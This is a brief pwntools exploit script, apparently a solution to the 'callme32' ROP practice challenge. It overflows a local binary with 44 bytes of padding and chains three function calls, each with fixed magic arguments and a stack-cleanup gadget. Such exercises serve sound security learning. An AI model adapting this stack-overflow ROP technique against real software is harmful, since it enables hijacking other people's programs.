#!/usr/bin/python3

from pwn import *

call1 = p32(0x080484f0)
call2 = p32(0x08048550)
call3 = p32(0x080484e0) 


arg1 = p32(0xdeadbeef)
arg2 = p32(0xcafebabe)
arg3 = p32(0xd00df00d)

args = arg1 + arg2 + arg3

pop2 = p32(0x080487f9)

junkdata = b"A" * 44

payload = junkdata
payload += call1 + pop2 + args 
payload += call2 + pop2 + args
payload += call3 + pop2 + args

p = process("./callme32")

p.sendline(payload)
p.interactive()
